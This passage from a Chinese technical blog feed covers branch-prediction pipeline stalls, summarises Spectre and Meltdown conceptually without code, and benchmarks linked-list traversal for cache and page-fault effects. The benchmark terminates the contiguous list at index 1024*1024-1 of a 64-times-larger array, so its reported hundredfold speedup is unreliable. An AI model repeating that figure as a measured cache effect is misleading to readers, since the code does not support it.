&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="no">rsi&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">QWORD&lt;/span> &lt;span class="no">PTR&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rsi&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0x8&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; --- 2
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">test&lt;/span> &lt;span class="no">rsi&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">rsi&lt;/span> &lt;span class="c">; --- 3
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">jne&lt;/span> &lt;span class="no">loop&lt;/span> &lt;span class="c">; --- 4
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">cdqe&lt;/span> &lt;span class="c">; --- 5
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">ret&lt;/span> &lt;span class="c">; --- 6
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="err">&amp;lt;&lt;/span>&lt;span class="nf">sum_counter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">list_head&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">&amp;gt;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nf">test&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">edi&lt;/span>
&lt;span class="nf">jle&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">d0&lt;/span> &lt;span class="err">&amp;lt;&lt;/span>&lt;span class="no">sum_counter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">list_head&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0x20&lt;/span>&lt;span class="err">&amp;gt;&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">edx&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">eax&lt;/span>
&lt;span class="nl">loop:&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0x1&lt;/span> &lt;span class="c">; --- 1
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">DWORD&lt;/span> &lt;span class="no">PTR&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rsi&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; --- 2
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="no">rsi&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">QWORD&lt;/span> &lt;span class="no">PTR&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rsi&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0x8&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; --- 3
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">cmp&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">edx&lt;/span> &lt;span class="c">; --- 4
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">jne&lt;/span> &lt;span class="no">loop&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="c">; --- 5
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">cdqe&lt;/span> &lt;span class="c">; --- 6
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">ret&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>想象有一颗 CPU 有 5 级流水线（&lt;code>IF&lt;/code>、&lt;code>ID&lt;/code>、&lt;code>EX&lt;/code>、&lt;code>MEM&lt;/code>、&lt;code>WB&lt;/code>），如上标注的顺序执行。&lt;/p>
&lt;p>在 &lt;code>sum_sentinel&lt;/code> 中，开始对 (5) 取指时，(1)才完成写回。对(6)取指时，(2)才写回。等到(3)写回，CPU才发现错误，于是从(4)往后的4级流水线全部作废清空，空泡形成。按每一级1周期算的话，就浪费了4个周期。&lt;/p>
&lt;p>在&lt;code>sum_counter&lt;/code>中，对(5)取指时，(1)已经写回。(4)依赖的寄存器数据就绪，立刻就能确定分支预测结果正确与否，没有浪费时钟周期。&lt;/p>
&lt;p>——以上都是想象中的 CPU ，想象中的流水线，实际上的流水线在哪个阶段才能发现分支预测错误，清空流水线，我也不知道。这里能提出的一个论点就是：尽早让分支依赖的数据就绪，尽快让 CPU 发现预测结果不正确，&lt;strong>可能可以&lt;/strong>降低分支预测失败的损失。话不能说满。而且针对分支预测器做优化不值得，Igor Ostrvsky 的博客前车之鉴在那里，过几年新架构 CPU 分支预测器说不定就不是这个规律了也不一定。&lt;/p>
&lt;h2 id="分支预测对安全的影响">分支预测对安全的影响&lt;/h2>
&lt;h3 id="spectre">spectre&lt;/h3>
&lt;p>也许有人会想CPU和安全有什么关系，这不是搞笑吗。但实际上对 CPU 漏洞的利用早已有之，对现代 CPU 高效运行的重要特性：缓存、乱序执行、分支预测进行攻击。近些年最著名的就有 &lt;a class="link" href="https://meltdownattack.com/meltdown.pdf" target="_blank" rel="noopener"
>Meltdown&lt;/a> 和 &lt;a class="link" href="https://spectreattack.com/spectre.pdf" target="_blank" rel="noopener"
>Spectre&lt;/a> 。&lt;/p>
&lt;p>在 &lt;a class="link" href="https://spectreattack.com/spectre.pdf" target="_blank" rel="noopener"
>Spectre Attacks: Exploiting Speculative Execution&lt;/a> 论文里这样写道：&lt;/p>
&lt;blockquote>
&lt;p>Modern processors use branch prediction and speculative execution to maximize performance. For example, if the destination of a branch depends on a memory value that is in the process of being read, CPUs will try to guess the destination and attempt to execute ahead. When the memory value finally arrives, the CPU either discards or commits the speculative computation. Speculative logic is unfaithful in how it executes, can access the victim’s memory and registers, and can perform operations with measurable side effects.&lt;/p>
&lt;/blockquote>
&lt;p>现代处理器使用分支预测和推测执行来最大化性能。举例来说，如果确定目标分支依赖于读取内存里的值，CPU会在执行前猜测其目标。当内存里的值抵达CPU，CPU要么抛弃，要么提交推测执行的结果。而推测执行的逻辑是不安全的，可能访问到受害程序的内存和寄存器，执行有明显副作用的操作。&lt;/p>
&lt;p>Meltdown 和 Spectre 的利用方式很类似，利用乱序执行或分支预测让 CPU 加载一块不属于自己的内存到缓存，而 CPU 发现分支预测失败或乱序执行无效时，并不会抛弃这块缓存。之后再通过瞬态指令创建一个旁路，取得缓存里的数据，就成功利用CPU绕开了隔离机制，非法读取到了任意一块内存。&lt;/p>
&lt;p>&lt;a class="link" href="https://razorpay.com/blog/meltdown-paper-summary/" target="_blank" rel="noopener"
>meltdown paper summary&lt;/a> 可以读一下。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>就是聊天，我也不敢说写得有多少对，写博客的过程里东查西找，最后写完有个基本映像就很开心了。&lt;/p>
&lt;p>分支预测对性能有影响，比起 cache line 的影响更小，而且优化价值不大，特意做优化反而可能在未来砸自己脚趾头。但分支预测又确实在现代cpu里起到了相当重要的作用，流水线造得再长，分支预测次次都错，那再长的流水线也和单周期没啥区别。&lt;/p>
&lt;p>这篇感觉没啥好总结的，反正写完是对计算机了解更深了一点就对啦。&lt;/p></description></item><item><title>CPU缓存、缺页和伪共享</title><link>https://nnnewb.github.io/blog/p/cpu-cache-page-fault-and-false-sharing/</link><pubDate>Tue, 15 Feb 2022 17:11:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/cpu-cache-page-fault-and-false-sharing/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>看B树的时候发现对缓存还是不够了解，但 cache line 又很神奇。要是有些比较吃CPU的代码改一下结构和访问方式啥的就能白嫖个50%性能提升那岂不是美哉。结合下面的参考文章大概聊一下。&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="http://igoro.com/archive/gallery-of-processor-cache-effects/" target="_blank" rel="noopener"
>Gallery of Processor Cache Effects&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="缓存行">缓存行&lt;/h2>
&lt;h3 id="介绍">介绍&lt;/h3>
&lt;p>首先，缓存行&lt;strong>不是&lt;/strong>“行”，这是对 &lt;em>cache line&lt;/em> 的直译，&lt;em>cache line&lt;/em> 和 &lt;em>cache block&lt;/em> 是同义的，忽略这个“行”字即可。&lt;/p>
&lt;p>cache line 指的是 CPU 高速缓存（L1~L3）中的一个缓存块，通常大小在 32/64/128 bytes ，现在常见的应该是 64 bytes 。cache line 之所以重要，是因为这是 CPU 访问主存的必经之路，频繁访问主存数据的场合，或者并发编程时，cache line 的影响还是不容忽视的。&lt;/p>
&lt;h3 id="简单的基准测试">简单的基准测试&lt;/h3>
&lt;p>光是说 cache line 多重要没有卵用，写个 demo 看看 cache line 的影响更直观。来一个最简单不过的单链表遍历。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;chrono&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstddef&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;functional&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iterator&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;ostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">chrono&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_data&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">struct&lt;/span> &lt;span class="nc">_data&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">mydata&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">function&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">fn&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">duration_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">milliseconds&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stop&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 一次分配，内存连续
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">list1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">mydata&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">64&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">cur&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">64&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">cur&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">list1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">cur&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cur&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">list1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 分别分配，内存不连续
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">list2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">mydata&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">cur2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">64&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">cur2&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">mydata&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">cur2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cur2&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 遍历连续的链表
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;first&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ptr&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ptr&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">*=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="c1">// 遍历不连续的链表
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;second&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ptr&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ptr&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">*=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>为了体现出差异，一共遍历了 &lt;code>1024*1024*64&lt;/code>个元素，每个元素 8 个字节，一共是512M数据。&lt;/p>
&lt;p>结果如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">weakptr  数据结构  ♥ 09:42  clang++.exe -m32 -O2 main.cpp -o main.exe
weakptr  数据结构  ♥ 09:43  ./main.exe
first: 2ms
second: 239ms
&lt;/code>&lt;/pre>&lt;/div>&lt;p>启用了&lt;code>O2&lt;/code>级别优化的情况下，遍历连续分配和不连续分配的链表时，速度相差达到了惊人的一百多倍。&lt;/p>
&lt;p>是&lt;code>O2&lt;/code>优化掉了第一种连续分配的链表遍历吗？&lt;code>-O0&lt;/code> 禁止优化看看。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">weakptr  数据结构  ♥ 09:44  clang++.exe -m32 -O0 main.cpp -o main.exe
weakptr  数据结构  ♥ 09:45  ./main.exe
first: 3ms
second: 262ms
&lt;/code>&lt;/pre>&lt;/div>&lt;p>并没有任何改善。&lt;/p>
&lt;p>因为考虑是和内存相关，影响内存访问性能的因素可以很自然想到缓存和缺页这两条。&lt;/p>
&lt;p>缓存指的是 cache line，一般说 false sharing 的时候提加 padding 对齐比较多。另一个情况就是遍历的时候，如果数据比较密集，那从主存刷新 cache line 就会更少，缓存利用更充分。所以像是数组这样的连续内存遍历速度通常远比链表之类的结构快。&lt;/p>
&lt;p>缺页又是另一个问题，缺页异常发生的几个常见场景包括：第一次访问分配好的内存，访问被交换到硬盘上的内存，&lt;code>mmap&lt;/code> ，以及&lt;code>SIGSEGV&lt;/code>等情况。一般来说的话，连续的内存分配下一次缺页可以得到连续的N个元素，不连续的分配第一次访问N个元素，最坏的情况下可能就要N次缺页异常。&lt;/p>
&lt;h3 id="缺页异常">缺页异常&lt;/h3>
&lt;p>先看缺页。这里使用微软的 Process Explorer 来观察 Page Fault 的出现情况。为了有效观察到page fault发生，我修改了一下代码，在 &lt;code>time_it&lt;/code> 函数里添加上了简单的 page fault 观测。&lt;/p>
&lt;p>&lt;em>提示，也可以用 Process Explorer 等工具观测程序运行时的 Page Fault 数量，但直接在代码里嵌入观测还是最准确的。如果有更好用的性能分析工具的话当然更好。&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="n">DWORD&lt;/span> &lt;span class="nf">getPageFaultCount&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetCurrentProcess&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">PROCESS_MEMORY_COUNTERS&lt;/span> &lt;span class="n">counters&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">GetProcessMemoryInfo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">counters&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">counters&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">cerr&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;GetProcessMemoryInfo failed, error &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">GetLastError&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">counters&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">PageFaultCount&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">function&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">before&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getPageFaultCount&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">fn&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">after&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getPageFaultCount&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">duration_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">milliseconds&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stop&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms, page fault count: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">after&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">before&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后对两个用例进行测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">initialization-1: 337ms, page fault count: 131329
initialization-2: 3591ms, page fault count: 265660
iteration-1: 3ms, page fault count: 0
iteration-2: 294ms, page fault count: 0
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以清晰地看到，在链表的初始化阶段，非连续分配的链表产生了连续分配的链表差不多两倍的 page fault，耗时接近十倍——我还得澄清一下这不是在暗示十倍的耗时都是 page fault 造成的，但 page fault 在其中也消耗了一部分资源总归是毫无疑问的。&lt;/p>
&lt;p>但随后的迭代阶段里并没有新的 page fault 产生，因为 两次 512M 的分配再加上循环new，堆维护指针的开销，差不多1.5G，还没有耗尽可用内存。&lt;/p>
&lt;p>排除 page fault 的影响后，现在考虑另一个影响因素：缓存。&lt;/p>
&lt;h3 id="缓存行-1">缓存行&lt;/h3>
&lt;p>关于缓存的分析这里使用了 Intel VTune Profiler 作为分析工具，来提取缓存命中情况。为了让VTune抓取更多信息来分析，对benchmark代码再次修改，遍历一次改成遍历100次。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
